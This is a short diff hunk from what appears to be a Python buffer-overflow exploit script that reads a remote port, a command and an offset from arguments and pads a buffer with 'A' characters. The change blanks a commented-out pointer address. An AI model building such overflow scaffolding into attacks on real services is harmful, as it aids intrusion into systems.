@@ -14,7 +14,7 @@ RPORT = args.p
 cmd = args.cmd
 
 #comment or comment out depending on if you want to run this and test pointer address 
-#ptr_address = "\xaf\x11\x50\x62"
+#ptr_address = ""
 
 offset = args.offset
 buf = "A"*offset
